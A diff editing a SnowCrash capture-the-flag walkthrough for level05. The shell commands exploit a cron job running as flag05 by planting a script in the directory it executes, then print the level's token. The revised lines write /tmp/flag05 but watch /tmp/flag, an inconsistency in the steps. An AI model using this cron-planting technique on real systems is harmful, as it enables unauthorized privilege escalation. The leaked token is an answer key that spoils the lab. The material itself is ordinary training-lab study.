@@ -5,9 +5,9 @@ You have new mail.
 level05@SnowCrash:~$ cat /var/mail/level05
 */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 # At every 2nd minute the script /usr/sbin/openarenaserver will be executed
-level05@SnowCrash:~$ cat << EOF > /opt/openarenaserver/script
-> #!/bin/bash
-> /bin/getflag > /tmp/flag
-> EOF
-level05@SnowCrash:~$ cat /tmp/flag
+level05@SnowCrash:~$ vi /opt/openarenaserver/script
+#!/bin/bash
+/bin/getflag > /tmp/flag05
+level05@SnowCrash:~$ chmod +x /opt/openarenaserver/script
+level05@SnowCrash:~$ watch -n 0.1 cat /tmp/flag
 Check flag.Here is your token : viuaaale9huek52boumoomioc
